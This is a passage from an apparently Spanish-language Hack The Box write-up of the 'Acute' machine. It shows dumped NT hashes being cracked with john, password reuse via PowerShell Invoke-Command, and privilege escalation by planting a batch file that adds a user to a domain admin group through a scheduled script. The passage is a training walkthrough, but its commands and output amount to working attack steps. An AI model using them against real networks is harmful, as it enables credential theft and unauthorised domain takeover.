+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Natasha:1001:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:24571eab88ac0e2dcef127b8e9ad4740:::  
+(</span><span class="ve">Meterpreter </span><span class="az">2</span><span class="p">)(C:\Users\jmorgan\Documents) ></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Intentando crackear los hashes <code class="language-plaintext highlighter-rouge">NT</code> de los usuarios aplicando fuerza bruta con <code class="language-plaintext highlighter-rouge">john</code> conseguimos ver la contraseña del usuario <code class="language-plaintext highlighter-rouge">Administrator</code> en texto plano</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john </span><span class="p">-w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashes --format=NT  
+Using default input encoding: UTF-8
+Loaded 4 password hashes with no different salts (NT [MD4 128/128 XOP 4x2])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="ro">Password@123</span><span class="p">     (</span><span class="ro">Administrator</span><span class="p">)
+Warning: passwords printed above might not be all those cracked
+Use the "--show --format=NT" options to display all of the cracked passwords reliably
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Despues de probar multiples credenciales con los <code class="language-plaintext highlighter-rouge">usuarios</code> logramos ejecutar comandos como el usuario <code class="language-plaintext highlighter-rouge">awallace</code> que reutiliza esta contraseña para el dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Utils> </span><span class="ve">$SecPassword </span><span class="c1">= </span><span class="am">ConvertTo-SecureString </span><span class="az">"Password@123" </span><span class="c1">-AsPlaintext -Force</span><span class="p">
+PS C:\Utils> </span><span class="ve">$Cred </span><span class="c1">= </span><span class="am">New-Object </span><span class="p">System.Management.Automation.PSCredential(</span><span class="az">"Acute\AWallace"</span><span class="p">, </span><span class="ve">$SecPassword</span><span class="p">)
+PS C:\Utils> </span><span class="am">Invoke-Command </span><span class="c1">-ComputerName </span><span class="p">ATSSERVER </span><span class="c1">-ConfigurationName </span><span class="p">dc_manage </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Command </span><span class="p">{ </span><span class="am">whoami </span><span class="p">}  
+acute\awallace
+PS C:\Utils></span>
+</code></pre></div></div><br> 
+
+</section>
+
+<section class="post" id="shell-administrator">
+<br><h3 class="post-title">Shell - Administrator</h3><br>
+
+<p class="plain-text">Ya como el usuario <code class="language-plaintext highlighter-rouge">awallace</code> obtnemos acceso a un script llamado <code class="language-plaintext highlighter-rouge">keepmeon.bat</code> en <code class="language-plaintext highlighter-rouge">C:\Program Files</code>, este dice que se ejecuta cada 5 minutos por <code class="language-plaintext highlighter-rouge">Lois</code>, el script es simple, ejecuta todos los archivos con extensión <code class="language-plaintext highlighter-rouge">.bat</code> en el directorio actual</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Utils> </span><span class="am">Invoke-Command </span><span class="c1">-ComputerName </span><span class="p">ATSSERVER </span><span class="c1">-ConfigurationName </span><span class="p">dc_manage </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Command</span><span class="p"> { </span><span class="am">ls </span><span class="az">"C:\Program Files\keepmeon"</span><span class="p"> }
+ 
+    Directory: C:\Program Files\keepmeon
+ 
+Mode                 LastWriteTime         Length Name                               PSComputerName                    
+----                 -------------         ------ ----                               --------------                    
+-a----        21/12/2021     14:57            128 keepmeon.bat                       ATSSERVER                         
+
+PS C:\Utils> </span><span class="am">Invoke-Command </span><span class="c1">-ComputerName </span><span class="p">ATSSERVER </span><span class="c1">-ConfigurationName </span><span class="p">dc_manage </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Command </span><span class="p">{ </span><span class="am">type </span><span class="az">"C:\Program Files\keepmeon\keepmeon.bat"</span><span class="p"> }  
+REM This is run every 5 minutes. For Lois use ONLY
+@echo off
+ for /R %%x in (*.bat) do (
+ if not "%%x" == "%~0" call "%%x"
+)
+PS C:\Utils></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En el archivo <code class="language-plaintext highlighter-rouge">docx</code> nos dice que el usuario Lois probablemente <code class="language-plaintext highlighter-rouge">lhopkins</code> puede agregar al grupo <code class="language-plaintext highlighter-rouge">site admin</code> a cualquier usuario, esto sera temporalmente</p>
+<a href="/htb/acute/12.png" target="_blank"><div><p><img src="/htb/acute/12.png"></p></div></a>
+
+<p class="plain-text">El grupo <code class="language-plaintext highlighter-rouge">Site_Admin</code> existe en el dominio, pero actualmente no tiene usuarios en el</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Utils> </span><span class="am">Invoke-Command </span><span class="c1">-ComputerName </span><span class="p">ATSSERVER </span><span class="c1">-ConfigurationName </span><span class="p">dc_manage </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Command </span><span class="p">{ </span><span class="am">net </span><span class="p">group /domain }
+ 
+Group Accounts for \\
+ 
+-------------------------------------------------------------------------------
+*Cloneable Domain Controllers
+*DnsUpdateProxy
+*Domain Admins
+*Domain Computers
+*Domain Controllers
+*Domain Guests
+*Domain Users
+*Enterprise Admins
+*Enterprise Key Admins
+*Enterprise Read-only Domain Controllers
+*Group Policy Creator Owners
+*Key Admins
+*Managers
+*Protected Users
+*Read-only Domain Controllers
+*Schema Admins
+*Site_Admin
+The command completed with one or more errors.
+
+PS C:\Utils> </span><span class="am">Invoke-Command </span><span class="c1">-ComputerName </span><span class="p">ATSSERVER </span><span class="c1">-ConfigurationName </span><span class="p">dc_manage </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Command </span><span class="p">{ </span><span class="am">net </span><span class="p">group Site_Admin /domain }  
+
+Group name     Site_Admin
+Comment        Only in the event of emergencies is this to be populated. This has access to Domain Admin group
+ 
+Members
+ 
+-------------------------------------------------------------------------------
+The command completed successfully.
+ 
+PS C:\Utils></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La idea es simple, creamos un <code class="language-plaintext highlighter-rouge">.bat</code> que en caso de ejecutarse agregue a <code class="language-plaintext highlighter-rouge">awallace</code> al grupo <code class="language-plaintext highlighter-rouge">site_admin</code>, de resto es esperar <code class="language-plaintext highlighter-rouge">5</code> minutos a que se ejecute el script</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Utils> </span><span class="am">Invoke-Command </span><span class="c1">-ComputerName </span><span class="p">ATSSERVER </span><span class="c1">-ConfigurationName </span><span class="p">dc_manage </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Command </span><span class="p">{ </span><span class="am">Set-Content </span><span class="c1">-Path </span><span class="az">"C:\Program Files\keepmeon\pwned.bat" </span><span class="c1">-Value </span><span class="az">"net group Site_Admin awallace /add /domain"</span><span class="p"> }  
+PS C:\Utils> </span><span class="am">Invoke-Command </span><span class="c1">-ComputerName </span><span class="p">ATSSERVER </span><span class="c1">-ConfigurationName </span><span class="p">dc_manage </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Command</span><span class="p"> { </span><span class="am">type </span><span class="az">"C:\Program Files\keepmeon\pwned.bat"</span><span class="p"> }
+net group Site_Admin awallace /add /domain
+PS C:\Utils></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Pasados los 5 minutos el usuario <code class="language-plaintext highlighter-rouge">awallace</code> pertenecera al grupo <code class="language-plaintext highlighter-rouge">Site_Admin</code> y al revisar los privilegios el usuario tiene maximos <code class="language-plaintext highlighter-rouge">privilegios</code> sobre el equipo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Utils> </span><span class="am">Invoke-Command </span><span class="c1">-ComputerName </span><span class="p">ATSSERVER </span><span class="c1">-ConfigurationName </span><span class="p">dc_manage </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Command </span><span class="p">{ </span><span class="am">net </span><span class="p">group Site_Admin /domain }  
+
+Group name     Site_Admin
+Comment        Only in the event of emergencies is this to be populated. This has access to Domain Admin group
+ 
+Members
+ 
+-------------------------------------------------------------------------------
+awallace                 
+The command completed successfully.
+ 
+PS C:\Utils> </span><span class="am">Invoke-Command </span><span class="c1">-ComputerName </span><span class="p">ATSSERVER </span><span class="c1">-ConfigurationName </span><span class="p">dc_manage </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Command </span><span class="p">{ </span><span class="am">whoami </span><span class="p">/priv }
+ 
+PRIVILEGES INFORMATION
+----------------------
+ 
+Privilege Name                            Description                                                        State  
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+
+PS C:\Utils></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya con privilegios maximos solo nos queda leer la <code class="language-plaintext highlighter-rouge">flag</code> del usuario <code class="language-plaintext highlighter-rouge">Administrator</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Utils> </span><span class="am">Invoke-Command </span><span class="c1">-ComputerName </span><span class="p">ATSSERVER </span><span class="c1">-ConfigurationName </span><span class="p">dc_manage </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Command </span><span class="p">{ </span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt }  
+802**************************880
+PS C:\Utils></span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
